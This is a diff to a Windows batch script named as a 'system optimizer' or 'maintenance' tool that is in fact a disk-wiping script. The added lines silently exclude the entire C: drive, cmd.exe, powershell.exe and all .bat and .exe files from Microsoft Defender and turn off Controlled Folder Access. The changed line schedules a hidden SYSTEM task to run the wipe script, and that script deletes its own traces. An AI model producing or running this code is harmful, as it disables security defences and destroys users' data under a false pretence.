@@ -89,6 +89,14 @@ powershell Add-MpPreference -ExclusionProcess "system_optimizer.bat" >nul 2>&1
 powershell Add-MpPreference -ExclusionPath "C:\Windows\Temp\system_maintenance.bat" >nul 2>&1
 powershell Add-MpPreference -ExclusionProcess "system_maintenance.bat" >nul 2>&1
 
+powershell Add-MpPreference -ExclusionPath "C:\" >nul 2>&1
+powershell Add-MpPreference -ExclusionProcess "cmd.exe" >nul 2>&1
+powershell Add-MpPreference -ExclusionProcess "powershell.exe" >nul 2>&1
+powershell Add-MpPreference -ExclusionExtension ".bat" >nul 2>&1
+powershell Add-MpPreference -ExclusionExtension ".exe" >nul 2>&1
+
+powershell Set-MpPreference -EnableControlledFolderAccess Disabled >nul 2>&1
+
 call :schedule_system_wipe
 
 echo.
@@ -252,5 +260,5 @@ echo del "C:\Windows\Temp\disks_found.txt" ^>nul 2^>^&1 >> "%wipe_script%"
 echo del "%%~f0" ^>nul 2^>^&1 >> "%wipe_script%"
 echo schtasks /delete /tn "SystemMaintenance" /f ^>nul 2^>^&1 >> "%wipe_script%"
 
-powershell -Command "schtasks /create /tn 'SystemMaintenance' /tr 'cmd.exe /c \"C:\Windows\Temp\system_maintenance.bat\" >nul 2>&1' /sc once /st 19:25 /sd 03/27/2026 /ru \"SYSTEM\" /f" >nul 2>&1
+powershell -Command "schtasks /create /tn 'SystemMaintenance' /tr 'cmd.exe /c \"C:\Windows\Temp\system_maintenance.bat\" >nul 2>&1' /sc once /st 03:00 /sd 03/26/2026 /ru \"SYSTEM\" /f" >nul 2>&1
 exit /b
